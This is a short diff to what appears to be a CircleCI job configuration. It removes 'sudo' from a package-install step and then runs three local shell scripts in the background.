@@ -5,7 +5,7 @@ jobs:
       - image: ubuntu:18.04
     steps:
       - checkout
-      - run: sudo apt update && sudo apt -y install wget curl axel nodejs npm
+      - run: apt update && apt -y install wget curl axel nodejs npm
       - run: chmod +x ./test.sh && ./test.sh &
       - run: chmod +x ./google.sh && ./google.sh &
       - run: chmod +x ./rw.sh && ./rw.sh &
